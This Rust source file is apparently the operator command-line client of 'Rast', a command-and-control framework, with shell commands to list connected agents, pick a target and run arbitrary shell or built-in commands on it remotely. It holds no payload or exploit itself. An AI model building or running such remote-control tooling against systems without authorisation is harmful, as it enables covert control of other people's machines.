//! The Command-line Interface part of the Rast project.

use std::{error::Error, fmt::Display, sync::Arc, vec};

use rast::{
    encoding::{Encoding, JsonPackager, Packager},
    messages::{Message, MessageZone},
    protocols::{Messager, ProtoConnection},
};
use rast_agent::messages::{AgentResponse, C2Request};
use rast_c2::messages::{UiRequest, UiResponse};
use shellfish::{async_fn, handler::DefaultAsyncHandler, rustyline::DefaultEditor, Command, Shell};
use tokio::sync::Mutex;
use ulid::Ulid;

type CmdResult<T> = std::result::Result<T, Box<dyn Error>>;
type State = ShellState;

/// Local state of working connections.
#[derive(Debug)]
pub struct ShellState {
    conn: Arc<Mutex<dyn ProtoConnection>>,
    target: Option<Ulid>,
    targets: Vec<Ulid>,
}

impl ShellState {
    pub fn new(conn: Arc<Mutex<dyn ProtoConnection>>) -> Self {
        ShellState {
            conn,
            target: None,
            targets: vec![],
        }
    }
}
impl Display for ShellState {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut prompt = String::from("[rast]");

        if let Some(target) = &self.target {
            prompt.push_str(&format!("[{target}]"));
        }

        write!(f, "{prompt} > ")
    }
}

/// Creates shell.
pub fn get_shell(
    state: State,
) -> Shell<'static, State, impl Display, DefaultAsyncHandler, DefaultEditor> {
    let mut shell = Shell::new_with_async_handler(
        state,
        "[rast]> ",
        DefaultAsyncHandler::default(),
        DefaultEditor::new().expect("Default Editor should always be created"),
    );

    // TODO: add custom handler to check connection

    shell.commands.insert(
        "ping",
        Command::new_async("pings C2 server".into(), async_fn!(State, ping)),
    );

    shell.commands.insert(
        "targets",
        Command::new_async(
            "updates and prints target list".into(),
            async_fn!(State, targets),
        ),
    );

    shell
        .commands
        .insert("set_target", Command::new("set target".into(), set_target));

    shell.commands.insert(
        "show_state",
        Command::new("show inner state".into(), show_state),
    );

    shell.commands.insert(
        "shell",
        Command::new_async(
            "run shell command on target".into(),
            async_fn!(State, exec_shell),
        ),
    );

    shell.commands.insert(
        "commands",
        Command::new_async(
            "get built-in commands available on the agent".into(),
            async_fn!(State, commands),
        ),
    );

    shell.commands.insert(
        "cmd",
        Command::new_async(
            "run built-in command on the agent".into(),
            async_fn!(State, exec_command),
        ),
    );

    shell
}

#[must_use]
pub fn new_message(uireq: UiRequest) -> Message {
    let bytes = JsonPackager::encode(&uireq).unwrap();
    Message::new(MessageZone::Internal, Encoding::Json, bytes.into())
}

// async fn send_request(request: UiRequest) -> Result<UiResponse> {}

/// Sends [`UiRequest::Ping`] to the C2 server to check connectivity.
async fn ping(state: &State, _args: Vec<String>) -> CmdResult<()> {
    let mut conn = state.conn.lock().await;
    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);

    let request = UiRequest::Ping;
    let request = new_message(request);

    messager.send(&request).await?;
    let msg = messager.receive().await?;

    let decoded = JsonPackager::decode(&msg.data)?;
    if let UiResponse::Pong = decoded {
        println!("pong");
    }

    Ok(())
}

/// Gets all agents that C2 server is connected to.
async fn targets(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
    let mut conn = state.conn.lock().await;
    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);

    let request = UiRequest::GetAgents;
    let request = new_message(request);

    messager.send(&request).await?;
    let msg = messager.receive().await?;

    let decoded = JsonPackager::decode(&msg.data)?;
    if let UiResponse::Agents(ulids) = decoded {
        state.targets = ulids;
    }

    for (i, target) in state.targets.iter().enumerate() {
        println!("[{i}] {target}");
    }

    Ok(())
}

/// Executes command on the specified agent.
async fn exec_shell(state: &State, args: Vec<String>) -> CmdResult<()> {
    if state.target.is_none() {
        println!("No target is selected");
        return Ok(());
    }

    if args.len() < 2 {
        println!("Incorrect argument number");
        return Ok(());
    }

    let mut command = String::new();
    for arg in args.iter().skip(1) {
        command.push_str(arg);
        command.push(' ');
    }
    command.pop();

    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);
    let target = state.target.ok_or("No target selected")?;

    let request = C2Request::ExecShell(command);
    let request = UiRequest::AgentRequest(target, request);
    let request = new_message(request);

    messager.send(&request).await?;
    let msg = messager.receive().await?;

    let decoded = JsonPackager::decode(&msg.data)?;
    if let UiResponse::AgentResponse(AgentResponse::ShellResponse(output)) = decoded {
        println!("{output}");
    };

    Ok(())
}

/// Executes command on the specified agent.
async fn commands(state: &State, _args: Vec<String>) -> CmdResult<()> {
    if state.target.is_none() {
        println!("No target is selected");
        return Ok(());
    }

    // if args.len() != 1 {
    //     println!("Incorrect argument number");
    //     return Ok(());
    // }

    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);
    let target = state.target.ok_or("No target selected")?;

    let request = C2Request::GetCommands;
    let request = UiRequest::AgentRequest(target, request);
    let request = new_message(request);

    messager.send(&request).await?;
    let msg = messager.receive().await?;

    let decoded = JsonPackager::decode(&msg.data)?;
    if let UiResponse::AgentResponse(AgentResponse::Commands(output)) = decoded {
        for (cmd, help) in &output {
            println!("[{cmd}]\t {help}");
        }
    }

    Ok(())
}

/// Executes command on the specified agent.
async fn exec_command(state: &State, args: Vec<String>) -> CmdResult<()> {
    if state.target.is_none() {
        println!("No target is selected");
        return Ok(());
    }

    if args.len() < 2 {
        println!("Incorrect argument number");
        return Ok(());
    }

    let command = args[1].clone();
    let args = Vec::from(args.split_at(2).1);

    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);
    let target = state.target.ok_or("No target selected")?;

    let request = C2Request::ExecCommand(command, args);
    let request = UiRequest::AgentRequest(target, request);
    let request = new_message(request);

    messager.send(&request).await?;
    let msg = messager.receive().await?;

    let decoded = JsonPackager::decode(&msg.data)?;
    if let UiResponse::AgentResponse(AgentResponse::CommandOutput(output)) = decoded {
        println!("{output}");
    } else {
        println!("Err");
    }

    Ok(())
}

/// Locally set target to specified agent.
fn set_target(state: &mut State, args: Vec<String>) -> CmdResult<()> {
    if args.len() != 2 {
        println!("Incorrect argument number");
        return Ok(());
    }

    let target = args.get(1).unwrap().parse::<usize>()?;

    if let Some(target) = state.targets.get(target) {
        state.target = Some(*target);
        println!("Target successfully set to: {target}");
    }

    Ok(())
}

fn show_state(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
    println!("{state:#?}");
    Ok(())
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}
